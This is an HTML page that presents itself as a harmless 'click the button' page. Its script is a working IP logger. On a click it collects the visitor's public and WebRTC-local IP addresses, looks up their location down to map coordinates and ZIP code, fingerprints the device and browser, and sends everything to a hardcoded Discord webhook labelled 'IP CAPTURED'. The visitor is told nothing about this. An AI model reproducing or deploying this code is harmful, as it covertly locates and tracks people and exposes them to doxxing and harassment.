<!DOCTYPE html>
<html>
<head>
    <title>click the button</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; text-align: center; }
        button { padding: 12px 24px; font-size: 16px; background-color: #5865F2; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background-color: #4752C4; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        #status { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
    </style>
</head>
<body>
    <h1>click the button website thing</h1>
    <p>click the button below:</p>
    
    <button id="trackButton">Click Me</button>
    <div id="status"></div>
    
    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
        
        // Device detection
        function detectDevice() {
            const ua = navigator.userAgent.toLowerCase();
            let deviceType = 'Desktop';
            let os = 'Unknown';
            let browser = 'Unknown';
            
            if (/mobile|android|iphone|ipad|ipod|blackberry|iemobile|opera mini|windows phone/i.test(ua)) {
                deviceType = 'Mobile';
            }
            if (/tablet|ipad|android(?!.*mobile)|kindle|silk/i.test(ua)) {
                deviceType = 'Tablet';
            }
            
            if (/windows/.test(ua)) {
                if (/windows nt 5/.test(ua)) os = 'Windows XP';
                else if (/windows nt 6.0/.test(ua)) os = 'Windows Vista';
                else if (/windows nt 6.1/.test(ua)) os = 'Windows 7';
                else if (/windows nt 6.2/.test(ua)) os = 'Windows 8';
                else if (/windows nt 6.3/.test(ua)) os = 'Windows 8.1';
                else if (/windows nt 10/.test(ua)) os = 'Windows 10';
                else if (/windows nt 11/.test(ua)) os = 'Windows 11';
                else os = 'Windows';
            } else if (/mac os x/.test(ua)) os = 'macOS';
            else if (/linux/.test(ua)) os = 'Linux';
            else if (/android/.test(ua)) os = 'Android';
            else if (/iphone|ipad|ipod/.test(ua)) os = 'iOS';
            else if (/cros/.test(ua)) os = 'Chrome OS';
            
            if (/edg/.test(ua)) browser = 'Microsoft Edge';
            else if (/chrome/.test(ua)) browser = 'Google Chrome';
            else if (/firefox/.test(ua)) browser = 'Mozilla Firefox';
            else if (/safari/.test(ua) && !/chrome/.test(ua)) browser = 'Safari';
            else if (/opera|opr/.test(ua)) browser = 'Opera';
            else if (/msie|trident/.test(ua)) browser = 'Internet Explorer';
            else if (/brave/.test(ua)) browser = 'Brave';
            
            return { deviceType, os, browser, userAgent: navigator.userAgent };
        }
        
        // Local IP detection
        async function getLocalIP() {
            return new Promise((resolve) => {
                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                if (!RTCPeerConnection) {
                    resolve('WebRTC not supported');
                    return;
                }
                
                const pc = new RTCPeerConnection({ iceServers: [] });
                const ips = [];
                
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(err => {});
                
                pc.onicecandidate = (event) => {
                    if (!event.candidate) {
                        if (ips.length) {
                            resolve(ips[0]);
                        } else {
                            resolve('Not detected');
                        }
                        return;
                    }
                    
                    const candidate = event.candidate.candidate;
                    const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                    const match = candidate.match(regex);
                    
                    if (match) {
                        const ip = match[1];
                        if (ip.startsWith('192.168.') || ip.startsWith('10.') || 
                            (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31)) {
                            if (!ips.includes(ip)) {
                                ips.push(ip);
                            }
                        }
                    }
                };
                
                setTimeout(() => {
                    pc.close();
                    resolve(ips.length ? ips[0] : 'Not detected');
                }, 1000);
            });
        }
        
        // Get accurate location with multiple API fallbacks
        async function getAccurateLocation(ip) {
            const apis = [
                // Try multiple APIs for best accuracy
                async () => {
                    try {
                        const res = await fetch(`https://ipapi.co/${ip}/json/`);
                        const data = await res.json();
                        if (data.error) throw new Error(data.reason);
                        return {
                            city: data.city || 'Unknown',
                            region: data.region || data.region_code || 'Unknown',
                            country: data.country_name || data.country || 'Unknown',
                            isp: data.org || 'Unknown',
                            zip: data.postal || 'Unknown',
                            timezone: data.timezone || 'Unknown',
                            lat: data.latitude || 'Unknown',
                            lon: data.longitude || 'Unknown',
                            source: 'ipapi.co'
                        };
                    } catch (e) { throw e; }
                },
                async () => {
                    try {
                        const res = await fetch(`https://ipwhois.app/json/${ip}`);
                        const data = await res.json();
                        return {
                            city: data.city || 'Unknown',
                            region: data.region || 'Unknown',
                            country: data.country || 'Unknown',
                            isp: data.isp || 'Unknown',
                            zip: data.postal || 'Unknown',
                            timezone: data.timezone || 'Unknown',
                            lat: data.latitude || 'Unknown',
                            lon: data.longitude || 'Unknown',
                            source: 'ipwhois.app'
                        };
                    } catch (e) { throw e; }
                },
                async () => {
                    try {
                        const res = await fetch(`https://freegeoip.app/json/${ip}`);
                        const data = await res.json();
                        return {
                            city: data.city || 'Unknown',
                            region: data.region_name || data.region_code || 'Unknown',
                            country: data.country_name || data.country_code || 'Unknown',
                            isp: data.isp || 'Unknown',
                            zip: data.zip_code || 'Unknown',
                            timezone: data.time_zone || 'Unknown',
                            lat: data.latitude || 'Unknown',
                            lon: data.longitude || 'Unknown',
                            source: 'freegeoip.app'
                        };
                    } catch (e) { throw e; }
                }
            ];
            
            // Try each API in order until one works
            for (const api of apis) {
                try {
                    const result = await api();
                    if (result.city !== 'Unknown' && result.lat !== 'Unknown' && result.lon !== 'Unknown') {
                        return result;
                    }
                } catch (e) {
                    console.log(`API failed: ${e.message}`);
                }
            }
            
            return {
                city: 'Unknown',
                region: 'Unknown',
                country: 'Unknown',
                isp: 'Unknown',
                zip: 'Unknown',
                timezone: 'Unknown',
                lat: 'Unknown',
                lon: 'Unknown',
                source: 'None'
            };
        }
        
        document.getElementById('trackButton').addEventListener('click', async function() {
            const button = this;
            const status = document.getElementById('status');
            
            button.disabled = true;
            button.textContent = 'Processing...';
            status.style.display = 'none';
            
            try {
                // Get public IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const publicIP = ipData.ip;
                
                // Get local IP
                const localIP = await getLocalIP();
                
                // Get accurate location
                const location = await getAccurateLocation(publicIP);
                
                // Detect device
                const deviceInfo = detectDevice();
                
                // Get screen info
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const screenDepth = screen.colorDepth;
                const pixelRatio = window.devicePixelRatio || 1;
                
                // Get browser info
                const cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
                const doNotTrack = navigator.doNotTrack || navigator.msDoNotTrack || 'Unknown';
                const onlineStatus = navigator.onLine ? 'Online' : 'Offline';
                const referrer = document.referrer || 'Direct visit';
                const language = navigator.language || 'Unknown';
                const javaEnabled = navigator.javaEnabled ? 'Yes' : 'No';
                const pdfEnabled = navigator.pdfViewerEnabled ? 'Yes' : 'No';
                
                // Create Google Maps link
                let mapsLink = 'No coordinates';
                if (location.lat !== 'Unknown' && location.lon !== 'Unknown') {
                    mapsLink = `[Google Maps](https://www.google.com/maps?q=${location.lat},${location.lon}&z=15) | [OpenStreetMap](https://www.openstreetmap.org/?mlat=${location.lat}&mlon=${location.lon}&zoom=15)`;
                }
                
                // Get time
                const now = new Date();
                const dateStr = `${now.getDate()}/${now.getMonth()+1}/${now.getFullYear()}`;
                let hours = now.getHours();
                const ampm = hours >= 12 ? 'PM' : 'AM';
                hours = hours % 12;
                hours = hours ? hours : 12;
                const timeStr = `${hours.toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')} ${ampm}`;
                
                // Create Discord embed with ALL information
                const embed = {
                    title: "IP CAPTURED - FULL REPORT",
                    color: 0xFF0000, // Red
                    fields: [
                        {
                            name: "ðŸŒ NETWORK INFORMATION",
                            value: `**Public IP:** \`${publicIP}\`\n**Local IP:** \`${localIP}\`\n**ISP:** ${location.isp}\n**VPN/Proxy:** Checking...`,
                            inline: true
                        },
                        {
                            name: "ðŸ“ GEO-LOCATION",
                            value: `**City:** ${location.city}\n**Region:** ${location.region}\n**Country:** ${location.country}\n**ZIP:** ${location.zip}\n**Timezone:** ${location.timezone}`,
                            inline: true
                        },
                        {
                            name: "ðŸ—ºï¸ COORDINATES & MAPS",
                            value: `**Latitude:** ${location.lat}\n**Longitude:** ${location.lon}\n**Accuracy Source:** ${location.source}\n**View on Maps:**\n${mapsLink}`,
                            inline: true
                        },
                        {
                            name: "ðŸ’» DEVICE DETAILS",
                            value: `**Device Type:** ${deviceInfo.deviceType}\n**Operating System:** ${deviceInfo.os}\n**Browser:** ${deviceInfo.browser}\n**Platform:** ${navigator.platform}`,
                            inline: true
                        },
                        {
                            name: "ðŸ–¥ï¸ DISPLAY & SYSTEM",
                            value: `**Screen:** ${screenWidth}x${screenHeight}\n**Pixel Ratio:** ${pixelRatio}\n**Color Depth:** ${screenDepth}bit\n**Language:** ${language}\n**CPU Cores:** ${navigator.hardwareConcurrency || 'Unknown'}`,
                            inline: true
                        },
                        {
                            name: "ðŸ”§ BROWSER SETTINGS",
                            value: `**Cookies:** ${cookiesEnabled}\n**Do Not Track:** ${doNotTrack}\n**Java:** ${javaEnabled}\n**PDF Viewer:** ${pdfEnabled}\n**Online:** ${onlineStatus}`,
                            inline: true
                        },
                        {
                            name: "ðŸ“Š SESSION INFORMATION",
                            value: `**Date:** ${dateStr}\n**Time:** ${timeStr}\n**Referrer:** ${referrer.substring(0, 50)}${referrer.length > 50 ? '...' : ''}\n**Page URL:** ${window.location.href}\n**User Agent Hash:** \`${btoa(deviceInfo.userAgent.substring(0, 30)).slice(0, 20)}...\``,
                            inline: false
                        }
                    ],
                    footer: {
                        text: `IP Logger â€¢ Data Source: ${location.source} â€¢ Click logged`
                    },
                    timestamp: new Date().toISOString()
                };
                
                const discordMessage = {
                    embeds: [embed],
                    username: "IP Logger Bot"
                };
                
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(discordMessage)
                });
                
                if (response.ok) {
                    status.textContent = 'boo.';
                    status.style.color = '#4CAF50';
                    status.style.backgroundColor = '#E8F5E9';
                } else {
                    throw new Error('Discord error');
                }
                
            } catch (error) {
                console.error('Error:', error);
                status.textContent = 'oops, error.';
                status.style.color = '#F44336';
                status.style.backgroundColor = '#FFEBEE';
            } finally {
                button.disabled = false;
                button.textContent = 'click me';
                status.style.display = 'block';
            }
        });
    </script>
</body>
</html>
